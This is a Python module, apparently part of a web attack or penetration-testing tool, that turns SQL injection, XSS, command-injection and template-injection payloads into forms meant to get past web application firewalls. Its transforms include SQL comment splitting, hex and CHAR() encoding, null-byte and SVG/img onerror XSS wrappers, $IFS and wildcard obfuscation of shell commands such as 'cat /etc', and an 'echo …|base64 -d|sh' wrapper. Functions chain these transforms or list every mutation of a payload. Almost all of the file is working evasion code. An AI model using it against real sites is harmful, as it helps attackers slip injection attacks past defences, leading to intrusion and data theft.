"""
WAF Evasion Transforms
======================
Transformations sémantique-preserving pour éviter la détection WAF.
"""

import re
import random
import urllib.parse
from typing import Dict, List, Optional, Callable, Any


# ═══════════════════════════════════════════════════════════════
# TRANSFORM DEFINITIONS
# ═══════════════════════════════════════════════════════════════

TRANSFORMS: Dict[str, Dict[str, Any]] = {
    # ─── SQLi Transforms ───
    "case_swap": {
        "vuln_types": ["sqli", "xss"],
        "description": "Alternate case: UNION → uNiOn",
        "preserves_semantic": True,
        "func": "_case_swap",
    },
    "inline_comment": {
        "vuln_types": ["sqli"],
        "description": "MySQL inline comments: UNION → UN/**/ION",
        "preserves_semantic": True,
        "func": "_inline_comment",
    },
    "whitespace_substitute": {
        "vuln_types": ["sqli"],
        "description": "Replace space with comment or tabs",
        "preserves_semantic": True,
        "func": "_whitespace_substitute",
    },
    "url_encode": {
        "vuln_types": ["sqli", "xss", "cmdi"],
        "description": "URL encode special chars",
        "preserves_semantic": True,
        "func": "_url_encode",
    },
    "double_url_encode": {
        "vuln_types": ["sqli", "xss", "cmdi"],
        "description": "Double URL encoding",
        "preserves_semantic": True,
        "func": "_double_url_encode",
    },
    "hex_encode": {
        "vuln_types": ["sqli"],
        "description": "Hex encode strings: 'admin' → 0x61646d696e",
        "preserves_semantic": True,
        "func": "_hex_encode",
    },
    "char_function": {
        "vuln_types": ["sqli"],
        "description": "Use CHAR() function",
        "preserves_semantic": True,
        "func": "_char_function",
    },
    "concat_split": {
        "vuln_types": ["sqli"],
        "description": "Split strings with CONCAT",
        "preserves_semantic": True,
        "func": "_concat_split",
    },
    
    # ─── XSS Transforms ───
    "tag_case_mix": {
        "vuln_types": ["xss"],
        "description": "<script> → <ScRiPt>",
        "preserves_semantic": True,
        "func": "_tag_case_mix",
    },
    "null_bytes": {
        "vuln_types": ["xss"],
        "description": "<script → <scr%00ipt",
        "preserves_semantic": True,
        "func": "_null_bytes",
    },
    "event_case_swap": {
        "vuln_types": ["xss"],
        "description": "onerror → OnErRoR",
        "preserves_semantic": True,
        "func": "_case_swap",
    },
    "svg_payload": {
        "vuln_types": ["xss"],
        "description": "Convert to SVG onload payload",
        "preserves_semantic": True,
        "func": "_svg_payload",
    },
    "img_payload": {
        "vuln_types": ["xss"],
        "description": "Convert to img onerror payload",
        "preserves_semantic": True,
        "func": "_img_payload",
    },
    
    # ─── CMDi Transforms ───
    "variable_sub": {
        "vuln_types": ["cmdi"],
        "description": "cat → c${x}at",
        "preserves_semantic": True,
        "func": "_variable_sub",
    },
    "ifs_sub": {
        "vuln_types": ["cmdi"],
        "description": "cat /etc → cat$IFS/etc",
        "preserves_semantic": True,
        "func": "_ifs_sub",
    },
    "quote_insert": {
        "vuln_types": ["cmdi"],
        "description": "cat → c'a't",
        "preserves_semantic": True,
        "func": "_quote_insert",
    },
    "wildcard": {
        "vuln_types": ["cmdi"],
        "description": "/bin/cat → /???/c?t",
        "preserves_semantic": True,
        "func": "_wildcard",
    },
    "base64_wrap": {
        "vuln_types": ["cmdi"],
        "description": "cmd → echo Y21k|base64 -d|sh",
        "preserves_semantic": True,
        "func": "_base64_wrap",
    },
    
    # ─── SSTI Transforms ───
    "ssti_attr_access": {
        "vuln_types": ["ssti"],
        "description": "config → ['config']",
        "preserves_semantic": True,
        "func": "_ssti_attr_access",
    },
}


# ═══════════════════════════════════════════════════════════════
# TRANSFORM IMPLEMENTATIONS
# ═══════════════════════════════════════════════════════════════

def _case_swap(payload: str) -> str:
    """Alternate case for each character."""
    result = []
    for i, c in enumerate(payload):
        if c.isalpha():
            result.append(c.upper() if i % 2 == 0 else c.lower())
        else:
            result.append(c)
    return ''.join(result)


def _inline_comment(payload: str) -> str:
    """Insert /**/ in SQL keywords."""
    keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 'UPDATE', 'DELETE']
    result = payload
    for kw in keywords:
        if kw.upper() in result.upper():
            # Find and replace preserving case
            idx = result.upper().find(kw.upper())
            if idx >= 0 and len(kw) > 2:
                mid = len(kw) // 2
                original = result[idx:idx+len(kw)]
                modified = original[:mid] + "/**/" + original[mid:]
                result = result[:idx] + modified + result[idx+len(kw):]
    return result


def _whitespace_substitute(payload: str) -> str:
    """Replace spaces with SQL comments or tabs."""
    substitutes = ["/**/", "%09", "%0a", "%0d", "+"]
    sub = random.choice(substitutes)
    return payload.replace(" ", sub)


def _url_encode(payload: str) -> str:
    """URL encode special characters."""
    return urllib.parse.quote(payload, safe='')


def _double_url_encode(payload: str) -> str:
    """Double URL encode."""
    first = urllib.parse.quote(payload, safe='')
    return urllib.parse.quote(first, safe='')


def _hex_encode(payload: str) -> str:
    """Convert string to hex: admin → 0x61646d696e."""
    return "0x" + payload.encode().hex()


def _char_function(payload: str) -> str:
    """Convert to CHAR() function: admin → CHAR(97,100,109,105,110)."""
    chars = [str(ord(c)) for c in payload]
    return f"CHAR({','.join(chars)})"


def _concat_split(payload: str) -> str:
    """Split with CONCAT: admin → CONCAT('ad','min')."""
    if len(payload) < 2:
        return payload
    mid = len(payload) // 2
    return f"CONCAT('{payload[:mid]}','{payload[mid:]}')"


def _tag_case_mix(payload: str) -> str:
    """Mix case in HTML tags."""
    return _case_swap(payload)


def _null_bytes(payload: str) -> str:
    """Insert null bytes in tag names."""
    # Insert %00 after < in tags
    result = re.sub(r'<(\w)', r'<\1%00', payload)
    return result


def _svg_payload(payload: str) -> str:
    """Convert JS code to SVG onload."""
    # Extract JS if it's just code
    js_code = payload
    if "alert" in payload or "(" in payload:
        return f"<svg/onload={js_code}>"
    return f"<svg/onload=alert({payload})>"


def _img_payload(payload: str) -> str:
    """Convert JS code to img onerror."""
    js_code = payload
    if "alert" in payload or "(" in payload:
        return f"<img src=x onerror={js_code}>"
    return f"<img src=x onerror=alert({payload})>"


def _variable_sub(payload: str) -> str:
    """Insert empty variable: cat → c${x}at."""
    if len(payload) < 2:
        return payload
    pos = random.randint(1, len(payload) - 1)
    return payload[:pos] + "${x}" + payload[pos:]


def _ifs_sub(payload: str) -> str:
    """Replace spaces with $IFS."""
    return payload.replace(" ", "${IFS}")


def _quote_insert(payload: str) -> str:
    """Insert quotes: cat → c'a't."""
    if len(payload) < 2:
        return payload
    result = []
    for i, c in enumerate(payload):
        result.append(c)
        if i < len(payload) - 1 and c.isalpha() and random.random() > 0.5:
            result.append("''")
    return ''.join(result)


def _wildcard(payload: str) -> str:
    """Replace chars with wildcards: /bin/cat → /???/c?t."""
    result = []
    for c in payload:
        if c.isalpha() and random.random() > 0.5:
            result.append("?")
        else:
            result.append(c)
    return ''.join(result)


def _base64_wrap(payload: str) -> str:
    """Wrap in base64 decode: cmd → echo Y21k|base64 -d|sh."""
    import base64
    encoded = base64.b64encode(payload.encode()).decode()
    return f"echo {encoded}|base64 -d|sh"


def _ssti_attr_access(payload: str) -> str:
    """Convert dot access to bracket: config → ['config']."""
    return f"['{payload}']"


# ═══════════════════════════════════════════════════════════════
# PUBLIC API
# ═══════════════════════════════════════════════════════════════

def get_available_transforms(vuln_type: str) -> List[str]:
    """Get list of transforms available for a vulnerability type."""
    return [
        name for name, info in TRANSFORMS.items()
        if vuln_type in info.get("vuln_types", [])
    ]


def get_transform_info(name: str, vuln_type: str = None) -> Optional[Dict]:
    """Get information about a transform."""
    info = TRANSFORMS.get(name)
    if info is None:
        return None
    if vuln_type and vuln_type not in info.get("vuln_types", []):
        return None
    return info


def apply_transform(payload: str, transform_name: str, vuln_type: str) -> str:
    """
    Apply a single transform to a payload.
    
    Args:
        payload: The payload to transform
        transform_name: Name of the transform
        vuln_type: Vulnerability type
        
    Returns:
        Transformed payload
    """
    info = get_transform_info(transform_name, vuln_type)
    if info is None:
        return payload
    
    func_name = info.get("func")
    if func_name is None:
        return payload
    
    # Get function from module globals
    func = globals().get(func_name)
    if func is None:
        return payload
    
    try:
        return func(payload)
    except Exception:
        return payload


def apply_transforms_chain(
    payload: str,
    transforms: List[str],
    vuln_type: str
) -> str:
    """
    Apply multiple transforms in sequence.
    
    Args:
        payload: The payload to transform
        transforms: List of transform names to apply
        vuln_type: Vulnerability type
        
    Returns:
        Transformed payload
    """
    result = payload
    for transform_name in transforms:
        result = apply_transform(result, transform_name, vuln_type)
    return result


def get_all_mutations(payload: str, vuln_type: str) -> List[Dict[str, str]]:
    """
    Generate all possible mutations for a payload.
    
    Args:
        payload: The payload to mutate
        vuln_type: Vulnerability type
        
    Returns:
        List of dicts with 'transform' and 'result' keys
    """
    available = get_available_transforms(vuln_type)
    mutations = []
    
    for transform_name in available:
        try:
            result = apply_transform(payload, transform_name, vuln_type)
            if result != payload:
                mutations.append({
                    "transform": transform_name,
                    "result": result,
                })
        except Exception:
            continue
    
    return mutations
